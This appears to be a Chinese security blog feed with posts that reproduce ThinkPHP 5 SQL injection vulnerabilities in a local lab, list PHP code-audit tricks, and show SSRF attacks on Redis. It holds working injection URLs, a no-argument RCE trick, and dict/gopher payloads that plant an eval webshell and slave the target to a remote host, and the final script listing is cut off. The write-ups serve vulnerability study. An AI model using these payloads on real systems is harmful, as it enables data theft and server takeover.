    <content type="html"><![CDATA[<h2 id="基础设施"><a href="#基础设施" class="headerlink" title="基础设施"></a>基础设施</h2><p>大致扫一遍ThinkPHP官方的《完全开发手册》，知道有疑问时应该去哪个章节找就行。</p><ol start="0"><li>通过composer拉取项目</li></ol><p><code>composer create-project --prefer-dist topthink/think=5.0.15 tpdemo</code></p><ol><li>调整<code>composer.json</code>中的依赖为需要测试的具体版本</li></ol><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;require&quot;: &#123;</span><br><span class="line">    &quot;php&quot;: &quot;&gt;=5.4.0&quot;,</span><br><span class="line">    &quot;topthink/framework&quot;: &quot;5.0.15&quot;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><ol start="2"><li><p>执行<code>composer update</code>更新项目</p></li><li><p>创建mysql数据库</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">create database tpdemo;</span><br><span class="line">use tpdemo;</span><br><span class="line">create table users(</span><br><span class="line">    id int primary key auto_increment,</span><br><span class="line">    username varchar(50) not null</span><br><span class="line">);</span><br><span class="line">insert into users(id,username) values(1,&#39;hoschen&#39;);</span><br><span class="line">create user tpdemo@localhost identified by &#39;passwd&#39;;</span><br><span class="line">grant all on tpdemo.* to tpdemo@localhost;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><ol start="4"><li><p>配置<code>application/database.php</code>中对应参数</p></li><li><p>将<code>application/config.php</code>中的<code>app_debug</code>和<code>app_trace</code>改为<code>true</code>，用于回显错误</p></li><li><p>编写<code>application/index/controller/Index.php</code>模块的代码构造漏洞输入点</p></li></ol><h2 id="SQL注入1"><a href="#SQL注入1" class="headerlink" title="SQL注入1"></a>SQL注入1</h2><p>Builder类（thinkphp/library/think/db/Builder.php）的parseData方法，将未过滤的用户输入拼接进insert/update语句，存在SQL注入漏洞。</p><p>影响版本：</p><ul><li>5.0.13&lt;=ThinkPHP&lt;=5.0.15</li><li>5.1.0&lt;=ThinkPHP&lt;=5.1.5</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tpdemo&#x2F;public&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;index&#x2F;index&amp;username[0]&#x3D;inc&amp;username[1]&#x3D;exp(~(select * from(select user())a))&amp;username[2]&#x3D;1</span><br></pre></td></tr></table></figure><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><a href="https://github.com/top-think/framework/releases?after=v5.0.18">5.0.16</a>版本更新说明中表示包含一个安全更新，具体看到<a href="https://github.com/top-think/framework/commit/091e7b734d4ce3e1288f47a7932a143fad73a4bd?branch=091e7b734d4ce3e1288f47a7932a143fad73a4bd&diff=split">改进inc/dec查询</a>这个commit</p><p><img src="/img/tp5ldfxsqli_a.png"></p><p>将源码版本更新为<code>5.0.15</code>，由<code>thinkphp/library/think/db/Builder.php</code>的113行可知触发这部分逻辑需要传入一个数组：</p><p><img src="/img/tp5ldfxsqli_b.png"></p><p>全局搜索对应的<code>parseData</code>方法，看到可以由718行的<code>insert</code>方法或是由823行的<code>update</code>方法触发。编写对应触发逻辑：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 通过request助手函数的get方法，获取$_GET[&#x27;username&#x27;]的数据</span></span><br><span class="line">        $username = request()-&gt;get(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line">        <span class="comment">// 通过db助手函数的insert方法，传入username数组（上面/a修饰符表示数组类型）</span></span><br><span class="line">        db(<span class="string">&#x27;users&#x27;</span>)-&gt;insert([<span class="string">&#x27;username&#x27;</span> =&gt; $username]);</span><br><span class="line">        <span class="comment">// 也可以通过update方法</span></span><br><span class="line">        <span class="comment">// db(&#x27;users&#x27;)-&gt;where(&#x27;id&#x27;,1)-&gt;update([&#x27;username&#x27; =&gt; $username]);</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Update success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟一下变量的传递过程可知，<code>username</code>即对应我们需要触发的那段逻辑中switch语句的<code>$val</code>，于是传入<code>username[0]=dec&amp;username[1]=a&amp;username[2]=1</code>进行动态调试，中间经过<code>parseKey</code>等函数后最终生成的sql语句：</p><p><img src="/img/tp5ldfxsqli_c.png"></p><p>显然<code>str_replace</code>函数是一个功能性函数，而并非是安全过滤函数，最终使得用户提供的数据被直接拼接进SQL语句中。</p><p>因为<code>username[0]</code>用于控制switch语句条件、<code>username[2]</code>会经过<code>floatval</code>函数强转，所以尝试通过<code>username[1]</code>传入报错注入Payload：</p><p><code>username[0]=dec&amp;username[1]=(extractvalue(1,concat(0x7e,(select user()),0x7e)))&amp;username[2]=1</code></p><p>得到报错：<code>1105 Only constant XPATH queries are supported</code>，XPATH系列用不了，换一种：</p><p><code>username[0]=dec&amp;username[1]=exp(~(select * from(select user())a))&amp;username[2]=1</code></p><p>最终拼接而成的SQL语句为：</p><p><code>&quot;INSERT INTO `users` (`username`) VALUES (exp(~(select * from(select user())a))-1) &quot;</code></p><p><img src="/img/tp5ldfxsqli_d.png"></p><p><code>update</code>方法类似就不再赘述了，需要注意的是官方修复时仅处理了<code>inc</code>和<code>dec</code>条件，但是并没有改动同样在switch语句中的<code>exp</code>条件，原因是当<code>username[0]</code>为<code>exp</code>时，会被<code>thinkphp/library/think/Request.php</code>中1096行的<code>filterExp</code>方法替换为<code>exp[空格]</code>，最终因为不满足switch语句的任意条件被结束。</p><h2 id="SQL注入2"><a href="#SQL注入2" class="headerlink" title="SQL注入2"></a>SQL注入2</h2><p>Builder类（thinkphp/library/think/db/Builder.php）的parseArrayData方法，将未过滤的用户输入拼接进insert/insertAll/update语句，存在SQL注入漏洞。</p><p>影响版本：</p><ul><li>5.1.6&lt;=ThinkPHP&lt;=5.1.7、以及部分5.1.8</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tpdemo&#x2F;public&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;index&#x2F;index&amp;username[0]&#x3D;point&amp;username[1]&#x3D;a&amp;username[2]&#x3D;exp(~(select * from(select user())a))^&amp;username[3]&#x3D;a</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><a href="https://github.com/top-think/framework/releases?after=v5.1.13">5.1.9</a>版本更新说明中表示包含一个安全更新，具体看到<a href="https://github.com/top-think/framework/commit/39bb0fe6d50ee77e0779f646b10bce08c442a5e3">改进mysql驱动</a>这个commit</p><p><img src="/img/tp5ldfxsqli_e.png"></p><p>直接删掉了<code>default</code>分支和<code>parseArrayData</code>方法。将源码版本更新为<code>5.1.17</code>，可以看到基本与SQL注入1逻辑相同。</p><p>全局搜索对应的<code>parseData</code>方法，看到可由1030行的<code>insert</code>方法、1063行的<code>insertAll</code>方法或是由1134行的<code>update</code>方法触发。需要编写的对应触发逻辑用SQL注入1的就行，而且多了一种触发方式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// insertAll方法接收一个二维数组</span></span><br><span class="line">db(<span class="string">&#x27;users&#x27;</span>)-&gt;insertAll([[<span class="string">&#x27;username&#x27;</span> =&gt; $username]]);</span><br></pre></td></tr></table></figure><p>跟一下变量的传递过程可知，<code>username</code>依然对应我们需要触发的那段逻辑中switch语句的<code>$val</code>，这次进入default分支跟进<code>parseArrayData</code>方法，看到需要让<code>username[0]</code>为<code>point</code>不然就会嗝屁：</p><p><img src="/img/tp5ldfxsqli_f.png"></p><p>因此传入<code>username[0]=point&amp;username[1]=a&amp;username[2]=b&amp;username[3]=c</code>进行动态调试，中间经过<code>parseData</code>等函数后最终生成的sql语句：</p><p><img src="/img/tp5ldfxsqli_g.png"></p><p>方便起见直接在<code>b</code>的位置传入报错注入Payload并闭合语句：</p><p><code>username[0]=point&amp;username[1]=a&amp;username[2]=exp(~(select * from(select user())a))^&amp;username[3]=a</code></p><p>最终拼接而成的SQL语句为：</p><p><code>&quot;INSERT INTO `users` (`username`) VALUES (exp(~(select * from(select user())a))^(&#39;a(a)&#39;)) &quot;</code></p><p><img src="/img/tp5ldfxsqli_h.png"></p><ul><li><code>update</code>和<code>insertAll</code>方法同理</li></ul><h2 id="SQL注入3"><a href="#SQL注入3" class="headerlink" title="SQL注入3"></a>SQL注入3</h2><p>Builder类（thinkphp/library/think/db/Builder.php）的parseWhereItem方法，将未过滤完全的用户输入拼接进where语句，存在SQL注入漏洞。</p><p>影响版本：</p><ul><li>5.0.10</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tpdemo&#x2F;public&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;index&#x2F;index&amp;username[0]&#x3D;not%20like&amp;username[1][0]&#x3D;%%&amp;username[1][1]&#x3D;anything&amp;username[2]&#x3D;)%20union%20select%20database(),user()%23</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><a href="https://github.com/top-think/framework/releases?after=v5.0.14">5.0.11</a>版本更新说明中表示包含一个安全更新，具体看到<a href="https://github.com/top-think/framework/commit/495020b7b0c16de40f20b08f2ab3be0a2b816b96">改进Request类filterExp方法</a>这个commit，增加了对<code>not like</code>的过滤。</p><p><img src="/img/tp5ldfxsqli_j.png"></p><p>凡是使用框架提供的请求变量获取方法(Request类<code>param</code>方法及<code>input</code>助手函数)，都会经过这个<code>filterExp</code>方法的过滤。针对<code>not like</code>操作符，编写对应的<code>where</code>方法触发逻辑：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$username = request()-&gt;get(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line">$result = db(<span class="string">&#x27;users&#x27;</span>)-&gt;where([<span class="string">&#x27;username&#x27;</span> =&gt; $username])-&gt;select();</span><br><span class="line">var_dump($result);</span><br></pre></td></tr></table></figure><p>相比前两个代码改动直接在漏洞点的补丁分析，这里的代码改动是在全局过滤函数的规则上，该如何根据这个变动敏感地嗅探到能被利用漏洞点呢？这是需要之后进一步思考的地方。</p><p>带着这个问题动态调试可以发现，输入流过程中有很多针对数组的解析函数，也会理解Payload要这样构造的原因：当然就是要满足一些if判断逻辑，让输入流进入到预期漏洞代码块了hhh（废话）</p><p><img src="/img/tp5ldfxsqli_k.png"></p><ul><li>因为PHP7的原因，需要调整一下implode函数的参数顺序</li></ul><p><img src="/img/tp5ldfxsqli_l.png"></p><p>一波拼接操作后生成的<code>whereStr</code>为<code>&quot;(`username` NOT LIKE &#39;%%&#39; ) UNION SELECT DATABASE(),USER()# `username` NOT LIKE &#39;anything&#39;)&quot;</code></p><p>这样就能让<code>username</code>字段匹配不到NULL之外的值避免占据回显点位，同时注释掉后面被implode函数合并进来的副作用语句，避免语法错误。</p><p>最终带入数据库执行的SQL语句为：</p><p><img src="/img/tp5ldfxsqli_m.png"></p><p>官方在个版本里新引入了<code>NOT LIKE</code>这个操作符，但是没加上对应的过滤规则导致了漏洞的产生。</p><h2 id="SQL注入4"><a href="#SQL注入4" class="headerlink" title="SQL注入4"></a>SQL注入4</h2><p>特定模式（<code>exp</code>）下的SQL语句执行：</p><p>影响版本：</p><ul><li>全版本</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tpdemo&#x2F;public&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;index&#x2F;index&amp;username&#x3D;) union select database(),user()%23</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这里官方认为属于正常功能不作修复，因此不存在补丁更新对比。编写对应触发逻辑来调试分析一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$username = request()-&gt;get(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line">$result = db(<span class="string">&#x27;users&#x27;</span>)-&gt;where([<span class="string">&#x27;username&#x27;</span> =&gt; $username])-&gt;select();</span><br><span class="line">var_dump($result);</span><br></pre></td></tr></table></figure><p><img src="/img/tp5ldfxsqli_i.png"></p><p>流程与上一个洞类似就不赘述了，查看《ThinkPHP5.0完全开发手册》193页可以看到说明了<code>exp</code>模式就是用作SQL语法模式的，所以我个人觉得官方不认为这是一个漏洞也在情理之中。</p><h2 id="SQL注入5"><a href="#SQL注入5" class="headerlink" title="SQL注入5"></a>SQL注入5</h2><p>Builder类（thinkphp/library/think/db/Builder.php）的parseOrder方法，将未过滤的用户输入拼接进select/update/delete语句，存在SQL注入漏洞。</p><p>影响版本：</p><ul><li>5.1.16&lt;=ThinkPHP&lt;=5.1.22</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tpdemo&#x2F;public&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;index&#x2F;index&amp;orderby[id&#96;|updatexml(1,concat(0x7e,(select user()),0x7e),1)%23]&#x3D;1</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><a href="https://github.com/top-think/framework/releases?after=v5.1.30">5.1.23</a>版本更新说明中表示改进了order方法的数组方式解析增强安全性，具体看到<a href="https://github.com/top-think/framework/commit/673e505421b25bdee2f02b668e5fd1ac79a3d190">改进order方法解析</a>这个commit</p><p><img src="/img/tp5ldfxsqli_n.png"></p><p>增加了对<code>)</code>和<code>#</code>符号的判断。将源码版本更新为<code>5.1.22</code>，全局搜索<code>parseOrder</code>方法，看到可以由1037行的select方法、1170行的update方法或是由1206行的delete方法触发。编写对应触发逻辑：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$orderby = request()-&gt;get(<span class="string">&#x27;orderby&#x27;</span>);</span><br><span class="line"><span class="comment">// $result = db(&#x27;users&#x27;)-&gt;where([&#x27;username&#x27; =&gt; &#x27;hoschen&#x27;])-&gt;order($orderby)-&gt;find();</span></span><br><span class="line"><span class="comment">// 也可以通过update方法，</span></span><br><span class="line"><span class="comment">// db(&#x27;users&#x27;)-&gt;where(&#x27;id&#x27;, 1)-&gt;order($orderby)-&gt;update([&#x27;username&#x27; =&gt; &#x27;hoschen&#x27;]);</span></span><br><span class="line"><span class="comment">// 还可以通过delete方法，支持XPATH系列函数</span></span><br><span class="line">db(<span class="string">&#x27;users&#x27;</span>)-&gt;where(<span class="string">&#x27;id&#x27;</span>, <span class="number">1</span>)-&gt;order($orderby)-&gt;delete();</span><br><span class="line">var_dump($result);</span><br></pre></td></tr></table></figure><p>这里传入Payload动态调试后可以发现拼接而成的SQL语句为：<code>&quot;DELETE FROM `users` WHERE  `id` = :where_AND_id ORDER BY `id`|updatexml(1,concat(0x7e,(select user()),0x7e),1)#` &quot; </code></p><p>为啥这里用的delete方法？因为在我的环境下前两种方法都会得到报错：<code>1105 Only constant XPATH queries are supported</code>，而通过exp等函数整数溢出报错也无效，希望知道原因的师傅指点我一下。</p><h2 id="SQL注入6"><a href="#SQL注入6" class="headerlink" title="SQL注入6"></a>SQL注入6</h2><p>聚合查询方法将未过滤的用户输入拼接进SQL语句中，存在SQL注入漏洞。</p><p>影响版本：</p><ul><li>5.0.0&lt;=ThinkPHP&lt;=5.0.21</li><li>5.1.3&lt;=ThinkPHP&lt;=5.1.25</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 5.1.11～5.1.25需要改为 id&#96;)</span><br><span class="line">id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-5"><a href="#漏洞分析-5" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><a href="https://github.com/top-think/framework/releases?after=v5.1.30">5.1.26</a>版本更新说明中表示包含一个安全更新，具体看到<a href="https://github.com/top-think/framework/commit/26a1b2fe9571c151ccd5e7ad05b3bb33385ecde3">改进mysql驱动和sqlsrv驱动</a>这个commit</p><p><img src="/img/tp5ldfxsqli_o.png"></p><p>只允许字母、数字、下划线、点号、星号，不然抛出异常。</p><ul><li>因为对框架不熟悉，想根据这类补丁对比找出具体的漏洞发生点实在是困难，得多学习历史漏洞积累经验才行。这里也由于暂未复现成功，只能先搁置一下了</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln/tree/master/ThinkPHP5">ThinkPHP-Vuln</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;基础设施&quot;&gt;&lt;a href=&quot;#基础设施&quot; class=&quot;headerlink&quot; title=&quot;基础设施&quot;&gt;&lt;/a&gt;基础设施&lt;/h2&gt;&lt;p&gt;大致扫一遍ThinkPHP官方的《完全开发手册》，知道有疑问时应该去哪个章节找就行。&lt;/p&gt;
&lt;ol start=&quot;0&quot;&gt;
</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="thinkphp" scheme="https://hosch3n.github.io/tags/thinkphp/"/>
    
    <category term="sqli" scheme="https://hosch3n.github.io/tags/sqli/"/>
    
  </entry>
  
  <entry>
    <title>PHP代码审计Tricks</title>
    <link href="https://hosch3n.github.io/2020/10/15/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Tricks/"/>
    <id>https://hosch3n.github.io/2020/10/15/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Tricks/</id>
    <published>2020-10-15T13:09:19.000Z</published>
    <updated>2020-12-07T14:43:53.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="反序列化调用不到类"><a href="#反序列化调用不到类" class="headerlink" title="反序列化调用不到类"></a>反序列化调用不到类</h2><p><img src="/img/phpdmsjtricks_a.png"></p><p>希望调用<code>ws.php</code>中<code>CLI\Agent</code>类的析构函数，但是传入<code>new CLI\Agent()</code>的序列化字符串后并未触发<code>die</code>标记，通过动态调试发现该框架此时会去寻找<code>lib/cli/agent.php</code>（但实际上是<code>Agent</code>类与<code>WS</code>类一起写在了<code>ws.php</code>中）</p><p><img src="/img/phpdmsjtricks_b.png"></p><p>解决方法是生成序列化字符串时，通过数组<code>array(new CLI\WS(), new CLI\Agent())</code>将两个类对象按顺序一同传入。这样虽然<code>autoload</code>包含<code>agent.php</code>同样会失败，但能够包含到<code>ws.php</code>也就能成功反序列化里面的<code>Agent</code>类。</p><ul><li>也看到了通过<code>new \CLI\WS(new \CLI\Agent())</code>的形式解决的</li></ul><h2 id="函数无参数RCE"><a href="#函数无参数RCE" class="headerlink" title="函数无参数RCE"></a>函数无参数RCE</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* HTTP Header</span></span><br><span class="line"><span class="comment">...</span></span><br><span class="line"><span class="comment">key: system(&#x27;ls -al&#x27;);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">var_dump(end(getallheaders()));</span><br></pre></td></tr></table></figure><h2 id="链中的函数参数对应不上"><a href="#链中的函数参数对应不上" class="headerlink" title="链中的函数参数对应不上"></a>链中的函数参数对应不上</h2><p>通过PHP编写的一些自定义函数，如果一些非关键参数缺失或者多余其实影响不大。但是PHP的内置函数可能是因为由C实现的原因，兼容性就没那么高。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">PHP Parametric Function RCE</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;反序列化调用不到类&quot;&gt;&lt;a href=&quot;#反序列化调用不到类&quot; class=&quot;headerlink&quot; title=&quot;反序列化调用不到类&quot;&gt;&lt;/a&gt;反序列化调用不到类&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/img/phpdmsjtricks_a.png&quot;&gt;&lt;/p&gt;
&lt;</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="php" scheme="https://hosch3n.github.io/tags/php/"/>
    
    <category term="unserialize" scheme="https://hosch3n.github.io/tags/unserialize/"/>
    
  </entry>
  
  <entry>
    <title>SSRF打Redis规避坏字符</title>
    <link href="https://hosch3n.github.io/2020/09/25/SSRF%E6%89%93Redis%E8%A7%84%E9%81%BF%E5%9D%8F%E5%AD%97%E7%AC%A6/"/>
    <id>https://hosch3n.github.io/2020/09/25/SSRF%E6%89%93Redis%E8%A7%84%E9%81%BF%E5%9D%8F%E5%AD%97%E7%AC%A6/</id>
    <published>2020-09-24T16:43:14.000Z</published>
    <updated>2020-11-23T08:13:04.000Z</updated>
    
    <content type="html"><![CDATA[<p>用dict协议通过SSRF间接打Redis的时候，数据中存在<code>:</code>、<code>&#39;</code>等特殊字符会导致set失败，可以通过位运算、gopher协议、主从同步数据、主从同步文件等方式躲开坏字符的坑。</p><h2 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h2><p>对存在特殊字符的数据进行位运算，再在目标Redis上通过位运算将数据还原回来。<a href="https://redis.io/commands/bitop">举个栗子</a>：</p><p><img src="/img/ssrfdredisgbhzf_a.png"></p><ol start="0"><li>利用抑或的特性先set两个不会与dict协议冲突的字符串</li></ol><p><code>dict://127.0.0.1:6379/set:c:&quot;|\x7f&#125;%6!,hd\x1f\a\x05\x14\x1byqq\x1di&#123;\x7f~&quot;</code></p><p><code>dict://127.0.0.1:6379/set:b:&#39;@@@@@@@@@@@@@@@@@@@@@@&#39;</code></p><ol><li>再在目标上还原</li></ol><p><code>dict://127.0.0.1:6379/bitop:xor:a:b:c</code></p><ol start="2"><li>设置RDB文件的保存路径为Web根目录</li></ol><p><code>dict://127.0.0.1:6379/config:set:dir:/var/www/html/</code></p><ol start="3"><li>设置RDB文件的保存文件名</li></ol><p><code>dict://127.0.0.1:6379/config:set:dbfilename:tmp.php</code></p><ol start="4"><li>持久化保存</li></ol><p><code>dict://127.0.0.1:6379/bgsave</code></p><p><img src="/img/ssrfdredisgbhzf_b.png"></p><h2 id="Gopher"><a href="#Gopher" class="headerlink" title="Gopher"></a>Gopher</h2><p>对redis-cli的命令数据抓包，利用gopher协议封装后重放给目标Redis。由于Redis的授权认证只有简单的一串<code>*2%0A%244%0Aauth%0A%248%0Afoobared</code>，且可以通过管道操作一次同时传输多条命令，因此这个方法还可以用来打知道密码的内网Redis。</p><ol start="0"><li>监听环回口6379端口并抓包</li></ol><p><code>sudo tcpdump port 6379 -i lo -w redis.pcap</code></p><p><img src="/img/ssrfdredisgbhzf_c.png"></p><ol><li>用gopher协议编码封装</li></ol><p><code>gopher://127.0.0.1:6379/_%244%0d%0aauth%0d%0a%248%0d%0afoobared%0d%0a*3%0d%0a%243%0d%0aset%0d%0a%241%0d%0aa%0d%0a%2422%0d%0a%3C%3F%3Deval(%24_GET%5B911%5D)%3B%3F%3E%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%243%0d%0adir%0d%0a%2414%0d%0a%2Fvar%2Fwww%2Fhtml%2F%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%2410%0d%0adbfilename%0d%0a%247%0d%0atmp.php%0d%0a*1%0d%0a%246%0d%0abgsave</code></p><ol start="2"><li>对数据体URL编码后发给目标</li></ol><p><code>?url=gopher://127.0.0.1:6379/_%25244%250d%250aauth%250d%250a%25248%250d%250afoobared%250d%250a*3%250d%250a%25243%250d%250aset%250d%250a%25241%250d%250aa%250d%250a%252422%250d%250a%253C%253F%253Deval(%2524_GET%255B911%255D)%253B%253F%253E%250d%250a*4%250d%250a%25246%250d%250aconfig%250d%250a%25243%250d%250aset%250d%250a%25243%250d%250adir%250d%250a%252414%250d%250a%252Fvar%252Fwww%252Fhtml%252F%250d%250a*4%250d%250a%25246%250d%250aconfig%250d%250a%25243%250d%250aset%250d%250a%252410%250d%250adbfilename%250d%250a%25247%250d%250atmp.php%250d%250a*1%250d%250a%25246%250d%250abgsave</code></p><p>如果嫌麻烦也可以用<a href="https://github.com/tarunkant/Gopherus">gopherus</a>交互式生成payload，同样需要二次编码后再打，<code>auth</code>开头的验证信息也要手动加一下</p><h2 id="主从同步数据"><a href="#主从同步数据" class="headerlink" title="主从同步数据"></a>主从同步数据</h2><p>将数据通过redis-cli写入VPS的Redis，让目标通过主从同步加载数据。</p><ol start="0"><li><p>在VPS上通过redis-cli写入数据</p></li><li><p>在目标上设置主从同步</p></li></ol><p><code>dict://127.0.0.1:6379/slaveof:1.1.1.1:6379</code></p><ol start="2"><li>设置RDB文件的保存路径为Web根目录</li></ol><p><code>dict://127.0.0.1:6379/config:set:dir:/var/www/html/</code></p><ol start="3"><li>设置RDB文件的保存文件名</li></ol><p><code>dict://127.0.0.1:6379/config:set:dbfilename:tmp.php</code></p><ol start="4"><li>持久化保存</li></ol><p><code>dict://127.0.0.1:6379/bgsave</code></p><ol start="5"><li>断开主从同步</li></ol><p><code>dict://127.0.0.1:6379/slaveof:no:one</code></p><h2 id="主从同步文件"><a href="#主从同步文件" class="headerlink" title="主从同步文件"></a>主从同步文件</h2><p>r35tart师傅将Redis主从同步RCE的脚本 <a href="https://github.com/r35tart/RedisWriteFile">RedisWriteFile</a> 改了一下实现了无杂质写文件，这是一个主动连目标Redis打的脚本。</p><p>脚本耦合度不高只要把一些主动打的功能删掉就可以了，然后利用SSRF手动发包即可。</p><ol start="0"><li>准备要无损写的文件，在VPS上执行脚本</li></ol><p><code>python3 ssrf-redis-writefile.py --lhost=1.1.1.1 --lport=6379 --lfile=test.txt</code></p><ol><li>设置RDB文件的保存路径为Web根目录</li></ol><p><code>dict://127.0.0.1:6379/config:set:dir:/var/www/html/</code></p><ol start="2"><li>设置RDB文件的保存文件名</li></ol><p><code>dict://127.0.0.1:6379/config:set:dbfilename:tmp.php</code></p><ol start="3"><li>在目标上设置主从同步</li></ol><p><code>dict://127.0.0.1:6379/slaveof:1.1.1.1:6379</code></p><ol start="4"><li>断开主从同步</li></ol><p><code>dict://127.0.0.1:6379/slaveof:no:one</code></p><p>如果要用过认证或者是希望一把梭打完，就抓下包封装下gopher协议，道理是一样的。</p><blockquote><p>但是在Redis中，为了防止http协议对Redis端口的攻击，它如果检测到”POST”或者”Host:”，就会中断这次连接，并且在日志中留下这行，我们可以通过添加%00绕过<br>但是Redis是一边判断一边逐行执行，所以只要在读到”Host:”之前把需要的操作做完即可，所以不加也没关系</p></blockquote><ul><li>附脚本</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 